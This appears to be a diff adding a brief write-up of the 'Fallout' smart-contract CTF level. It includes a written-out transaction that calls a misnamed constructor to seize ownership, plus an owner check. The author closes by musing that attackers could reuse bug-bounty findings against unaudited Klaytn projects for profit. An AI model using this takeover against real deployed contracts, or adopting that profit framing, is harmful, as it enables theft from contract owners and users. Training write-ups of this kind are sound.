@@ -1,0 +1,34 @@
+Fallout
+Difficulty 2/10
+
+Claim ownership of the contract below to complete this level.
+
+  Things that might help
+
+Solidity Remix IDE
+
+
+
+At a glance, it just seems like I just need to call Fallout() function?
+
+But should be harder than that. 
+
+    sendTransaction({from: "0x14a5b8f7DF340D89F3f7609dedCcE79a416E946c", to: "0x33A83D7bF84D70B21a2C9E72C09e258CC9D50B6d", data: "0x6fab5ddf", value: toWei("0.001")}).then((receipt)=> {console.log(receipt)});
+
+Transaction Mined.
+
+Now Imma try to submit the instance. oh, before that Imma check the owner address;
+
+    contract.owner();;
+
+Well. I am the owner. so now I submit the instance.
+
+Boom. Solved.
+
+According to what the game says when the level was completed.
+DynamicPyramid() guys did not change its contractor's name when the contract was changing to
+'Rubixi',  I think since Klaytn contracts are usually not open source and not really audited,
+they should have a whole lot of shits like this.
+I mean, when Klayswap was hacked, it was such a simple frontend hack.
+Maybe hackers can go through the vulnerability found in bugbounties and try exact same mal-intended
+approaches to Klaytn deployed projects, hackers will be rich.
